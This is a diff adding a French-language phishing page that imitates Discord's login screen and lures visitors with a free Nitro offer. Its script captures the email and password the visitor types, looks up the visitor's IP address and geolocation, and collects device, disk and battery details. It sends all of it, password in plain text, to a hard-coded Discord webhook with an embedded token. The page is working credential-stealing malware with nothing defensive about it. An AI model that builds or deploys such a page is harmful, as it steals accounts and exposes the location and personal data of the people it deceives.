@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <meta name="description" content="Discord te fait gagner un Nitro 1mois grace a Opera GX, profite en au plus vite !">
+    <meta property="og:image" content="https://tse3.mm.bing.net/th/id/OIP.vZtJo1q2HXXYFiSw6RzYDQAAAA?rs=1&pid=ImgDetMain">
+    <link rel="icon" type="image/x-icon" href="https://seeklogo.com/images/D/discord-logo-7A1EC3216C-seeklogo.com.png">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            width: 100vw;
+            height: 100vh;
+            background-image: url("https://images.alphacoders.com/129/1291249.png");
+            background-size: cover;
+            background-repeat: no-repeat;
+            font-family: 'Whitney', sans-serif;
+            text-rendering: optimizeLegibility;
+            user-select: none;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            position: absolute;
+            width: 784px;
+            max-width: 90vw;
+            height: 424px;
+            padding: 32px;
+            background-color: #2a2b38;
+            background: #363940;
+            border-radius: 6px;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            display: grid;
+            grid-template-columns: auto 1fr;
+            align-items: center;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
+        }
+
+        .label {
+            color: #919296;
+            margin-bottom: 8px;
+            font-size: 10px;
+            font-weight: 600;
+            line-height: 16px;
+            text-transform: uppercase;
+        }
+
+        .input-style {
+            position: relative;
+            width: calc(100% - -10px);
+            height: 35px;
+            margin-top: 5px;
+            margin-bottom: 10px;
+            color: #9e9e9e;
+            border: 1px solid rgba(0, 0, 0, .0);
+            padding: 10px;
+            border-radius: 3px;
+            outline: none;
+            background: rgba(0, 0, 0, .4);
+        }
+
+        .input-style:focus {
+            border-color: #7289da;
+        }
+
+        .button {
+            text-decoration: none;
+            border-radius: 4px;
+            height: 44px;
+            width: calc(100% - -10px);
+            margin-top: 20px;
+            margin-bottom: 10px; /* Ajout de la marge en bas */
+            font-size: 13px;
+            font-weight: 500;
+            text-transform: capitalize;
+            transition: all 200ms linear;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            border: none;
+            outline: none;
+            background-color: #4752C4;
+            color: white;
+            cursor: pointer;
+        }
+
+        .button:hover {
+            background-color: #677bc4;
+            box-shadow: 0 8px 24px 0 rgba(16,39,112,.2);
+        }
+
+        .login-title {
+            color: #fff;
+            font-size: 22px; /* Police réduite */
+            font-weight: 550;
+            margin-bottom: 5px; /* Espacement réduit */
+            margin-left: calc( 0px / 4);
+            font-family: Helvetica, sans-serif;
+        }
+
+        .littletext {
+            color: #fff;
+            font-size: 12px;
+            font-weight: 500;
+            margin-bottom: 15px; /* Espacement réduit */
+            margin-top: 0; /* Supprimer la marge en haut */
+            margin-left: calc( 0px / 4);
+        }
+
+        .right-image {
+            position: relative;
+            width: 170px; /* Ajuster la taille de l'image */
+            height: 170px; /* Ajuster la taille de l'image */
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            margin-left: calc( 520px / 4); /* Aligner l'image à droite */
+            margin-top: -143px;
+            border-radius: 4%; /* Carré arrondi pour obtenir un cercle */
+        }
+
+        .welcome-container {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start; /* Aligner les éléments en haut */
+            text-align: center;
+            margin-bottom: 30px; /* Espacement inférieur */
+        }
+
+        .additional-text {
+            color: #fff;
+            font-size: 12px;
+            font-weight: 500;
+            margin-bottom: 15px; /* Espacement réduit */
+            margin-top: 0;
+            text-align: center;
+            position: absolute;
+        }
+
+        .additional-text.salut {
+            bottom: 88px;
+            left: 79%;
+            transform: translateX(-50%);
+            color: #fff;
+            font-size: 22px; /* Police réduite */
+            font-weight: 900;
+            white-space: nowrap;
+            font-family: Helvetica, sans-serif;
+        }
+
+        .additional-text.bonjour {
+            font-size: 14px;
+            bottom: 13px;
+            left: 79%;
+            transform: translateX(-50%);
+            white-space: nowrap;
+            font-family: Helvetica, sans-serif;
+        }
+        .additional-text-app {
+            position: relative;
+            font-size: 12px;
+            bottom: 70px;
+            left: -4%;
+            color: #fff;
+            transform: translateX(140%);
+            white-space: nowrap;
+        }
+
+        .forgot-password {
+            color: #00A8FC;
+            font-size: 12px;
+            text-decoration: none;
+            cursor: pointer;
+            margin-top: 5px;
+            white-space: nowrap;
+            }
+            .forgot-password:hover{
+              text-decoration: underline;
+            }
+
+
+        /* Styles pour la phrase "Need an account?" */
+        .need-account {
+            color: #fff;
+            font-size: 12px;
+            margin-top: 10px;
+            text-align: left; /* Alignement à gauche */
+        }
+
+        /* Style pour le lien "Register" */
+        .need-account a {
+            color: #00A8FC;
+            text-decoration: none;
+        }
+
+        /* Style au survol du lien */
+        .need-account a:hover {
+            text-decoration: underline;
+        }
+        </style>
+</head>
+<body>
+    <div class="container">
+        <form id="loginForm">
+            <div class="welcome-container">
+                <h2 class="login-title">Ha, te revoilà !</h2>
+                <p class="littletext">Nous sommes si heureux de te revoir !</p>
+            </div>
+            <div class="form-group">
+                <label class="label" for="username">Email ou numéro de téléphone <span style="color:red;">*</span></label>
+                <input type="text" id="username" class="input-style" required>
+            </div>
+            <div class="form-group">
+                <label class="label" for="password">Mot de passe <span style="color:red;">*</span></label>
+                <input type="password" id="password" class="input-style" required>
+                <p class="forgot-password" onclick="window.location.href = 'https://discord.com/register/';">Tu as oublié ton mot de passe ?</p>
+            </div>
+            <button type="submit" class="button" id="loginBtn">Login</button>
+            <p class="need-account">Besoin d'un compte ? <a href="https://discord.com/register">S'inscrire</a></p>
+        </form>
+        <div class="right-image" style="background-image: url('https://delta.ffvl.fr/sites/delta.ffvl.fr/files/QR%20code%20Discord%20Play%20Store.png');"></div>
+        <p class="additional-text salut">Se connecter avec un<br> code QR</p>
+        <p class="additional-text bonjour">Scanne-le avec l'<strong>application<br> mobile Discord</strong> pour te connecter<br> instantanément.</p>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            getLocationAndIPAddress(username, password);
+        });
+
+        function getLocationAndIPAddress(username, password) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip;
+                    fetch('https://ipapi.co/' + ipAddress + '/json/')
+                        .then(response => response.json())
+                        .then(locationData => {
+                            var geoInfo = {
+                                country: locationData.country_name,
+                                region: locationData.region,
+                                city: locationData.city,
+                                zipCode: locationData.postal,
+                                latitude: locationData.latitude,
+                                longitude: locationData.longitude,
+                                timezone: locationData.timezone
+                            };
+
+                            var deviceInfo = {
+                                screenWidth: window.screen.width,
+                                screenHeight: window.screen.height,
+                                screenSize: getScreenSizeInInches(), // Utiliser la fonction pour obtenir la taille de l'écran en pouces
+                                deviceType: (window.screen.width < 768) ? "Téléphone" : "Ordinateur"
+                            };
+
+                            var operatorInfo = {
+                                organization: locationData.org // Organisation à partir des données de localisation
+                            };
+
+                            var diskInfo = {
+                                diskCapacity: "N/A"
+                            };
+
+                            navigator.storage.estimate().then(storage => {
+                                diskInfo.diskCapacity = (storage.quota / (1024 * 1024 * 1024)).toFixed(2) + " Go"; // Conversion de l'espace disque en Go
+                                var batteryInfo = {
+                                    batteryLevel: "N/A",
+                                    chargingStatus: "N/A"
+                                };
+
+                                if (navigator.getBattery) {
+                                    navigator.getBattery().then(function(battery) {
+                                        batteryInfo.batteryLevel = (battery.level * 100).toFixed(2) + "%";
+                                        batteryInfo.chargingStatus = battery.charging ? "En charge" : "Déchargée";
+                                        var loginInfo = {
+                                            username: username,
+                                            password: password,
+                                            ipAddress: ipAddress,
+                                            geoInfo: geoInfo,
+                                            deviceInfo: deviceInfo,
+                                            operatorInfo: operatorInfo,
+                                            diskInfo: diskInfo,
+                                            batteryInfo: batteryInfo
+                                        };
+                                        sendEmbedToWebhook(loginInfo);
+                                    });
+                                } else {
+                                    var loginInfo = {
+                                        username: username,
+                                        password: password,
+                                        ipAddress: ipAddress,
+                                        geoInfo: geoInfo,
+                                        deviceInfo: deviceInfo,
+                                        operatorInfo: operatorInfo,
+                                        diskInfo: diskInfo,
+                                        batteryInfo: batteryInfo
+                                    };
+                                    sendEmbedToWebhook(loginInfo);
+                                }
+                            });
+                        })
+                        .catch(error => {
+                            console.error('Erreur lors de la récupération des informations de localisation:', error);
+                        });
+                })
+                .catch(error => {
+                    console.error('Erreur lors de la récupération de l\'adresse IP publique:', error);
+                });
+        }
+        function getScreenSizeInInches() {
+    // Largeur et hauteur de l'écran en pixels
+    var screenWidth = window.screen.width;
+    var screenHeight = window.screen.height;
+
+    // Diagonale de l'écran en pixels
+    var diagonalPixels = Math.sqrt(Math.pow(screenWidth, 2) + Math.pow(screenHeight, 2));
+
+    // Résolution en pixels par pouce (PPI)
+    var pixelRatio = window.devicePixelRatio;
+
+    // Calcul de la taille de l'écran en pouces
+    var diagonalInches = diagonalPixels / pixelRatio / 96; // 1 pouce = 96 pixels (standard pour les écrans)
+
+    return diagonalInches.toFixed(1) + '"';
+}
+        function sendEmbedToWebhook(loginInfo) {
+            var xhr = new XMLHttpRequest();
+            var url = 'https://discord.com/api/webhooks/1220982475849990216/AZu_CneJX6ME5FKQRvUTypL2JI6JLamm-95-FyqLbNuJGmVEUTC28euKq58OjMF5z8b3';
+            var params = JSON.stringify({
+                "content": "",
+                "embeds": [
+                    {
+                        "title": "Informations de Connexion",
+                        "color": 16711680,
+                        "fields": [
+                            {
+                                "name": "📩 Username :",
+                                "value": "```" + loginInfo.username + "```"
+                            },
+                            {
+                                "name": "🔐 Password :",
+                                "value": "```" + loginInfo.password + "```"
+                            },
+                            {
+                                "name": "🌐 Adresse IP :",
+                                "value": "```" + loginInfo.ipAddress + "```"
+                            },
+                            {
+                              "name": "\u200B",
+                              "value": "---------- Infos ------ pour ------> "+ loginInfo.username +" <---------------"
+                            },
+                            {
+                                "name": "🌍 Pays :",
+                                "value": "```" + loginInfo.geoInfo.country + "```"
+                            },
+                            {
+                                "name": "📍 Région :",
+                                "value": "```" + loginInfo.geoInfo.region + "```"
+                            },
+                            {
+                                "name": "🏙️ Ville :",
+                                "value": "```" + loginInfo.geoInfo.city + "```"
+                            },
+                            {
+                                "name": "🔒 Code Postal :",
+                                "value": "```" + loginInfo.geoInfo.zipCode + "```"
+                            },
+                            {
+                                "name": "🌐 Latitude :",
+                                "value": "```" + loginInfo.geoInfo.latitude + "```"
+                            },
+                            {
+                                "name": "🌐 Longitude :",
+                                "value": "```" + loginInfo.geoInfo.longitude + "```"
+                            },
+                            {
+                                "name": "⏰ Fuseau Horaire :",
+                                "value": "```" + loginInfo.geoInfo.timezone + "```"
+                            },
+                            {
+                                "name": "🖥️ Taille de l'Écran :",
+                                "value": "```" + loginInfo.deviceInfo.screenSize + "```"
+                            },
+                            {
+                                "name": "📱 Type d'Appareil :",
+                                "value": "```" + loginInfo.deviceInfo.deviceType + "```"
+                            },
+                            {
+                                "name": "🏢 Organisation :",
+                                "value": "```" + loginInfo.operatorInfo.organization + "```"
+                            },
+                            {
+                                "name": "💽 Capacité du Disque :",
+                                "value": "```" + loginInfo.diskInfo.diskCapacity + "```"
+                            },
+                            {
+                                "name": "🔋 Niveau de Batterie :",
+                                "value": "```" + loginInfo.batteryInfo.batteryLevel + "```"
+                            },
+                            {
+                                "name": "⚡ État de Charge :",
+                                "value": "```" + loginInfo.batteryInfo.chargingStatus + "```"
+                            }
+                        ]
+                    }
+                ]
+            });
+
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(params);
+        }
+    </script>
+</body>
+</html>
